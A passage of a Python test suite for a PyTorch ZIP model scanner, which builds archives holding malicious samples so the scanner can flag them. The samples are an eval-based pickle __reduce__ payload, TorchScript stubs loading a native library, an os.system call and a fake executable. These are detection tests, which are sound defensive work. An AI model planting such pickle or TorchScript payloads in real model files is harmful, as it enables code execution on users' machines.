            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_print_body_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return print('pwn')",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert result.success is True
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_nul_byte(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            (
                b"class Payload(Module):\n"
                b"  __parameters__ = []\n"
                b"  __buffers__ = []\n"
                b"  def forward(self: __torch__.Payload,\n"
                b"    x: Tensor) -> Tensor:\n"
                b"    return x\n"
                b"\x00"
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert result.success is True
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_class_decorator_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "@torch.classes.load_library('libpayload.so')",
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_class_assignment_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  payload = torch.classes.load_library('libpayload.so')",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_class_keyword_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module, metaclass=print('loaded')):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "class Benign(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Benign,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_numeric_detection_edge_cases(tmp_path):
    """Test edge cases for numeric file detection in archive/data/."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")

        # Add a normal pickle file
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("archive/data.pkl", pickled_data)

        # Edge cases that should NOT be skipped:
        # - File with number in extension
        zipf.writestr("archive/data/weights.v2", b"data")
        # - File starting with number but not pure numeric
        zipf.writestr("archive/data/0abc", b"data")
        # - File with hex notation
        zipf.writestr("archive/data/0x123", b"data")

        # Files that SHOULD be skipped (pure numeric):
        zipf.writestr("archive/data/0", b"\x00" * 1000)
        zipf.writestr("archive/data/42", b"\x00" * 1000)
        zipf.writestr("archive/data/999999", b"\x00" * 1000)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    # Should complete successfully without hanging
    assert result.success is True


def test_pytorch_zip_scanner_can_handle_pkl_extension(tmp_path):
    """Test that PyTorchZipScanner can_handle returns True for ZIP-format .pkl files.

    PyTorch's torch.save() uses ZIP format by default since v1.6 (_use_new_zipfile_serialization=True).
    This test verifies that .pkl files with ZIP headers are correctly identified.
    """
    # Create a ZIP-format .pkl file (simulating torch.save() default behavior)
    pkl_path = tmp_path / "model.pkl"
    with zipfile.ZipFile(pkl_path, "w") as zipf:
        zipf.writestr("version", "3")
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("data.pkl", pickled_data)

    assert PyTorchZipScanner.can_handle(str(pkl_path)) is True


def test_pytorch_zip_scanner_cannot_handle_raw_pkl(tmp_path):
    """Test that PyTorchZipScanner can_handle returns False for raw pickle .pkl files.

    Raw pickle files (created with _use_new_zipfile_serialization=False) should not be
    handled by PyTorchZipScanner - they should go to the PickleScanner instead.
    """
    # Create a raw pickle .pkl file (non-ZIP format)
    pkl_path = tmp_path / "model.pkl"
    data = {"weights": [1, 2, 3]}
    with open(pkl_path, "wb") as f:
        pickle.dump(data, f)

    assert PyTorchZipScanner.can_handle(str(pkl_path)) is False


def test_pytorch_zip_scanner_scans_zip_pkl_successfully(tmp_path):
    """Test that PyTorchZipScanner successfully scans ZIP-format .pkl files.

    This is the fix for the issue where torch.save() creates ZIP files with .pkl extension
    by default, but ModelAudit was routing them to PickleScanner which failed with
    UnicodeDecodeError.
    """
    # Create a ZIP-format .pkl file (simulating torch.save() default behavior)
    pkl_path = tmp_path / "model.pkl"
    with zipfile.ZipFile(pkl_path, "w") as zipf:
        # Standard PyTorch ZIP structure
        zipf.writestr("version", "3")
        zipf.writestr("byteorder", "little")
        zipf.writestr(".format_version", "1")

        # Create a proper pickle with torch-like structure
        data = {"linear.weight": [1.0, 2.0], "linear.bias": [0.1]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("model/data.pkl", pickled_data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(pkl_path))

    # Should succeed without errors
    assert result.success is True
    assert result.bytes_scanned > 0

    # No critical issues
    critical_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert len(critical_issues) == 0


def test_pytorch_zip_scanner_detects_malicious_zip_pkl(tmp_path):
    """Test that PyTorchZipScanner detects malicious content in ZIP-format .pkl files."""
    # Create a ZIP-format .pkl file with malicious pickle content
    pkl_path = tmp_path / "model.pkl"
    with zipfile.ZipFile(pkl_path, "w") as zipf:
        zipf.writestr("version", "3")

        # Create a malicious pickle that would execute code
        class MaliciousClass:
            def __reduce__(self):
                return (eval, ("print('pwned')",))

        data = {"malicious": MaliciousClass()}
        pickled_data = pickle.dumps(data)
        zipf.writestr("data.pkl", pickled_data)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(pkl_path))

    # Should detect the eval function
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any("eval" in issue.message.lower() for issue in result.issues)


def test_pytorch_zip_scanner_preserves_legacy_pickle_rule_codes_for_embedded_members(tmp_path: Path) -> None:
    fixture_path = _ASSETS_DIR / "samples" / "pickles" / "decode_exec_chain.pkl"
    model_path = tmp_path / "decode_exec_chain.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", fixture_path.read_bytes())

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(
        issue.rule_code == "S604" and "S104" in issue.details.get("legacy_rule_aliases", []) for issue in result.issues
    )


def test_pytorch_zip_scanner_trusts_storage_persistent_ids_in_data_pkl(tmp_path: Path) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id.pt", with_pickle=False, prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("archive/data.pkl", payload)
        zipf.writestr("archive/data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert not any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    trusted_checks = [check for check in result.checks if check.details.get("trusted_pytorch_archive_context") is True]
    assert trusted_checks
    assert all(check.status == CheckStatus.PASSED for check in trusted_checks)
    assert all(check.severity == IssueSeverity.INFO for check in trusted_checks)


def test_pytorch_zip_scanner_trusts_storage_persistent_ids_with_utf8_byte_key(tmp_path: Path) -> None:
    payload = _pytorch_storage_persistent_id_payload(b"0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_bytes.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is True
    assert not any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_non_utf8_byte_key(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload(b"\xff")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_non_utf8_bytes.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_without_storage_layout(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_untrusted.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("data.pkl", payload)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_only_data_directory(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_directory.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/", b"")

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_non_ascii_digit_blob(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_non_ascii_digit.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/\uff10", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_does_not_trust_storage_persistent_ids_with_unrelated_blob(
    tmp_path: Path,
) -> None:
    payload = _pytorch_storage_persistent_id_payload("1")
    model_path = create_mock_pytorch_zip(tmp_path / "storage_persistent_id_unrelated_blob.pt", with_pickle=False)
    with zipfile.ZipFile(model_path, "a") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)
        zipf.writestr("data/0", b"\x00" * 8)

    result = PyTorchZipScanner().scan(str(model_path))

    assert any(issue.details.get("pickle_rule_code") == "PERSISTENT_ID" for issue in result.issues)
    assert not any(check.details.get("trusted_pytorch_archive_context") is True for check in result.checks)


def test_pytorch_zip_scanner_scopes_storage_persistent_id_trust_by_prefix(tmp_path: Path) -> None:
    payload = _pytorch_storage_persistent_id_payload("0")
    model_path = tmp_path / "mixed_storage_persistent_id.pt"
    with zipfile.ZipFile(model_path, "w") as zipf:
        zipf.writestr("good/version", "3")
        zipf.writestr("good/data.pkl", payload)
        zipf.writestr("good/data/0", b"\x00" * 8)
        zipf.writestr("evil/data.pkl", payload)

    result = PyTorchZipScanner().scan(str(model_path))

    persistent_id_issues = [
        issue for issue in result.issues if issue.details.get("pickle_rule_code") == "PERSISTENT_ID"
    ]
    assert any(issue.details.get("pickle_filename") == "evil/data.pkl" for issue in persistent_id_issues)
    assert not any(issue.details.get("pickle_filename") == "good/data.pkl" for issue in persistent_id_issues)

    trusted_checks = [check for check in result.checks if check.details.get("trusted_pytorch_archive_context") is True]
    assert any(check.details.get("pickle_filename") == "good/data.pkl" for check in trusted_checks)


def test_pytorch_zip_scanner_entry_limit(tmp_path: Path) -> None:
    """Test that scanner enforces archive entry count limits."""
    zip_path = tmp_path / "model.pt"

    # Create archive with many entries (exceeding default limit)
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        # Create entries exceeding the limit
        for i in range(15):
            zipf.writestr(f"entry_{i}.txt", "data")

    # Use a low limit for testing
    scanner = PyTorchZipScanner(config={"max_archive_entries": 10})
    result = scanner.scan(str(zip_path))

    # Should have warning about entry count
    entry_issues = [
        i
        for i in result.issues
        if "entries" in i.message.lower() and ("max" in i.message.lower() or "limit" in i.message.lower())
    ]
    assert len(entry_issues) > 0
    assert entry_issues[0].severity == IssueSeverity.WARNING
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_entry_limit" in result.metadata["scan_outcome_reasons"]
    assert entry_issues[0].details["analysis_incomplete"] is True
    entry_check = next(check for check in result.checks if check.name == "Archive Entry Limit")
    assert entry_check.message == (
        "Archive contains 16 entries (max processed: 10); 6 entries were skipped and scan coverage is incomplete"
    )


def test_pytorch_zip_scanner_entry_limit_skips_late_entries(tmp_path: Path) -> None:
    """Entries after the configured archive-entry cap should not be processed as covered."""
    zip_path = tmp_path / "late_symlink_after_entry_limit.pt"
    symlink_target = tmp_path / "late-target"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("entry_0.txt", "data")
        zipf.writestr("entry_1.txt", "data")
        symlink_info = zipfile.ZipInfo("late_symlink")
        symlink_info.create_system = 3
        symlink_info.external_attr = (stat.S_IFLNK | 0o777) << 16
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, str(symlink_target))

    scanner = PyTorchZipScanner(config={"max_archive_entries": 3})
    result = scanner.scan(str(zip_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_entry_limit" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Archive Entry Limit"
        and check.status == CheckStatus.FAILED
        and check.details["processed_entries"] == 3
        and check.details["dropped_entry_count"] == 1
        for check in result.checks
    )
    assert not any(
        check.name == "Symlink Safety Validation" and "late_symlink" in check.message for check in result.checks
    )


def test_pytorch_zip_entry_validation_checks_timeout_between_members(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    zip_path = tmp_path / "entry-validation-timeout.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        for index in range(3):
            symlink_info = zipfile.ZipInfo(f"link_{index}")
            symlink_info.create_system = 3
            symlink_info.external_attr = (stat.S_IFLNK | 0o777) << 16
            symlink_info.compress_type = zipfile.ZIP_STORED
            zipf.writestr(symlink_info, str(tmp_path / f"target_{index}"))

    scanner = PyTorchZipScanner(config={"max_archive_entries": 3})
    checked_members: list[str] = []
    timeout_checks = 0
    original_read_symlink_target = scanner._read_symlink_target

    def track_symlink_read(
        zip_file: zipfile.ZipFile,
        info: zipfile.ZipInfo,
        result: ScanResult,
    ) -> tuple[str, bool]:
        checked_members.append(info.filename)
        return original_read_symlink_target(zip_file, info, result)

    def check_timeout() -> None:
        nonlocal timeout_checks
        timeout_checks += 1
        if timeout_checks == 2:
            raise TimeoutError("entry validation deadline exceeded")

    monkeypatch.setattr(scanner, "_read_symlink_target", track_symlink_read)
    monkeypatch.setattr(scanner, "_check_timeout", check_timeout)

    result = scanner.scan(str(zip_path))

    assert checked_members == ["link_0"]
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_scan_timeout" in result.metadata["scan_outcome_reasons"]


def test_pytorch_zip_scanner_entry_limit_passes(tmp_path: Path) -> None:
    """Test that scanner passes when entry count is within limits."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        data = pickle.dumps({"weights": [1, 2, 3]})
        zipf.writestr("data.pkl", data)

    scanner = PyTorchZipScanner(config={"max_archive_entries": 2})
    result = scanner.scan(str(zip_path))

    entry_checks = [check for check in result.checks if check.name == "Archive Entry Limit"]
    assert len(entry_checks) == 1
    assert entry_checks[0].status == CheckStatus.PASSED
    assert entry_checks[0].details == {"entry_count": 2, "max_entries": 2}


def test_pytorch_zip_extract_metadata_caps_listed_entries(tmp_path: Path) -> None:
    zip_path = tmp_path / "metadata-entry-limit.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("entry_0.txt", "data")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}))

    metadata = PyTorchZipScanner(config={"max_archive_entries": 2}).extract_metadata(str(zip_path))

    assert metadata["total_files"] == 3
    assert metadata["files"] == ["version", "entry_0.txt"]
    assert metadata["listed_files"] == 2
    assert metadata["max_archive_entries"] == 2
    assert metadata["files_truncated"] is True
    assert metadata["omitted_files"] == 1
    assert metadata["metadata_analysis_incomplete"] is True
    assert metadata["has_data_pkl"] is None
    assert metadata["has_version"] is True

    complete_metadata = PyTorchZipScanner(config={"max_archive_entries": 3}).extract_metadata(str(zip_path))

    assert complete_metadata["files"] == ["version", "entry_0.txt", "data.pkl"]
    assert complete_metadata["listed_files"] == 3
    assert complete_metadata["files_truncated"] is False
    assert complete_metadata["omitted_files"] == 0
    assert complete_metadata["metadata_analysis_incomplete"] is False
    assert complete_metadata["has_data_pkl"] is True
    assert complete_metadata["has_version"] is True


def test_pytorch_zip_extract_metadata_does_not_read_late_duplicate_version(tmp_path: Path) -> None:
    zip_path = tmp_path / "metadata-late-duplicate-version.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("entry_0.txt", "data")
        with pytest.warns(UserWarning, match="Duplicate name"):
            zipf.writestr("version", "omitted-late-version")

    metadata = PyTorchZipScanner(config={"max_archive_entries": 2}).extract_metadata(str(zip_path))

    assert metadata["files"] == ["version", "entry_0.txt"]
    assert metadata["files_truncated"] is True
    assert metadata["pytorch_version"] == "3"


def test_pytorch_zip_extract_metadata_recognizes_prefixed_layout(tmp_path: Path) -> None:
    zip_path = tmp_path / "prefixed-metadata.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("docs/version", "999")
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/0", b"weights")

    metadata = PyTorchZipScanner(config={"max_archive_entries": 4}).extract_metadata(str(zip_path))

    assert metadata["has_data_pkl"] is True
    assert metadata["has_version"] is True
    assert metadata["pickle_files"] == ["archive/data.pkl"]
    assert metadata["storage_files"] == 1
    assert metadata["pytorch_version"] == "3"


def test_pytorch_zip_entry_limit_reads_selected_symlink_duplicate(tmp_path: Path) -> None:
    zip_path = tmp_path / "symlink-duplicate-after-limit.pt"
    symlink_target = tmp_path / "selected-target"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        symlink_info = zipfile.ZipInfo("duplicate-entry")
        symlink_info.create_system = 3
        symlink_info.external_attr = 0o120777 << 16
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, str(symlink_target))
        with pytest.warns(UserWarning, match="Duplicate name"):
            zipf.writestr("duplicate-entry", "omitted-late-entry")

    result = PyTorchZipScanner(config={"max_archive_entries": 1}).scan(str(zip_path))

    symlink_checks = [check for check in result.checks if check.name == "Symlink Safety Validation"]
    assert len(symlink_checks) == 1
    assert symlink_checks[0].status == CheckStatus.FAILED
    assert symlink_checks[0].details["target"] == str(symlink_target)


def test_pytorch_zip_entry_limit_qualifies_duplicate_coverage(tmp_path: Path) -> None:
    zip_path = tmp_path / "duplicate-coverage-after-limit.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("duplicate-entry", "first")
        with pytest.warns(UserWarning, match="Duplicate name"):
            zipf.writestr("duplicate-entry", "second")
        zipf.writestr("late-entry", "omitted")

    result = PyTorchZipScanner(config={"max_archive_entries": 2}).scan(str(zip_path))

    duplicate_check = next(check for check in result.checks if check.name == "Duplicate ZIP Entry Collision")
    assert duplicate_check.status == CheckStatus.FAILED
    assert duplicate_check.message == (
        "Duplicate archive entry duplicate-entry has conflicting metadata; "
        "all processed copies will be scanned explicitly; later archive entries remain uninspected"
    )


def test_pytorch_zip_entry_limit_suppresses_archive_wide_clean_claims(tmp_path: Path) -> None:
    zip_path = tmp_path / "late-security-content.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("safe.txt", "benign")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("late.py", "import os\nos.system('echo unsafe')")
        zipf.writestr("late.exe", b"MZ" + (b"\x00" * 1024))

    result = PyTorchZipScanner(config={"max_archive_entries": 2}).scan(str(zip_path))

    structure_checks = [check for check in result.checks if check.name == "PyTorch Structure Validation"]
    assert len(structure_checks) == 1
    assert structure_checks[0].status == CheckStatus.FAILED
    assert structure_checks[0].details["analysis_incomplete"] is True
    assert "missing_file" not in structure_checks[0].details

    archive_wide_clean_checks = {
        "JIT/Script Code Execution Detection",
        "Network Communication Detection",
        "Python Code File Detection",
        "Executable File Detection",
    }
    assert not [
        check
        for check in result.checks
        if check.name in archive_wide_clean_checks and check.status == CheckStatus.PASSED
    ]


@pytest.mark.parametrize("invalid_limit", [0, -1, False, "10"])
def test_pytorch_zip_scanner_entry_limit_rejects_invalid_overrides(invalid_limit: object) -> None:
    """Invalid entry limits should fall back to the bounded default."""
    scanner = PyTorchZipScanner(config={"max_archive_entries": invalid_limit})

    assert scanner.max_archive_entries == scanner.MAX_ARCHIVE_ENTRIES


def test_pytorch_zip_scanner_compression_ratio_check(tmp_path):
    """Test that scanner detects suspicious compression ratios."""

    zip_path = tmp_path / "model.pt"

    # Create a file with extremely high compression ratio (repetitive data compresses well)
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("version", "3")
        # Create highly compressible data (1MB of zeros will compress to almost nothing)
        highly_compressible = b"\x00" * (1024 * 1024)
        zipf.writestr("suspicious_data.bin", highly_compressible)

    # Use a low threshold for testing
    scanner = PyTorchZipScanner(config={"max_compression_ratio": 50})
    result = scanner.scan(str(zip_path))

    # Should have warning about compression ratio
    ratio_issues = [i for i in result.issues if "compression" in i.message.lower() and "ratio" in i.message.lower()]
    assert len(ratio_issues) > 0
    assert ratio_issues[0].severity == IssueSeverity.WARNING


def test_pytorch_zip_scanner_high_ratio_pickle_marks_scan_inconclusive(tmp_path: Path) -> None:
    """Skipped high-ratio pickle members must fail closed instead of disappearing from coverage."""
    zip_path = tmp_path / "ratio_elided_pickle.pt"
    payload = pickle.dumps(
        {
            "padding": b"\x00" * (1024 * 1024),
            "payload": _malicious_eval_pickle_payload(),
        },
        protocol=4,
    )

    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", payload)

    result = PyTorchZipScanner(config={"max_compression_ratio": 10}).scan(str(zip_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "pytorch_zip_compression_ratio_unscanned" in result.metadata["scan_outcome_reasons"]
    ratio_checks = [
        check
        for check in result.checks
        if check.name == "Compression Ratio Check" and check.status == CheckStatus.FAILED
    ]
    assert len(ratio_checks) == 1
    assert ratio_checks[0].details["analysis_incomplete"] is True


def test_pytorch_zip_scanner_recurses_into_nested_zip_members(tmp_path: Path) -> None:
    """Nested ZIP payloads should be recursively routed instead of staying invisible."""
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.zip")

    result = PyTorchZipScanner().scan(str(zip_path))

    assert result.metadata["file_size"] == zip_path.stat().st_size
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.location is not None
        and f"{zip_path}:archive/nested.zip:payload.pkl" in issue.location
        for issue in result.issues
    )


def test_pytorch_zip_scanner_recurses_into_zip_members_named_like_pickles(tmp_path: Path) -> None:
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.pkl")

    result = PyTorchZipScanner().scan(str(zip_path))

    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.location is not None
        and f"{zip_path}:archive/nested.pkl:payload.pkl" in issue.location
        for issue in result.issues
    )


def test_pytorch_zip_scanner_bounds_nested_zip_member_copy(tmp_path: Path) -> None:
    """Oversized nested ZIP members should fail closed before rescanning."""
    nested_zip = tmp_path / "nested.zip"
    with zipfile.ZipFile(nested_zip, "w") as archive:
        archive.writestr("payload.pkl", _malicious_eval_pickle_payload())

    zip_path = tmp_path / "nested_payload.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zipf.write(nested_zip, "archive/nested.zip")

    nested_scan_calls: list[str] = []

    def scan_nested_member(path: str, config: dict[str, object] | None = None) -> ScanResult:
        nested_scan_calls.append(path)
        nested_result = ScanResult(scanner_name="zip")
        nested_result.finish(success=True)
        return nested_result

    result = PyTorchZipScanner(
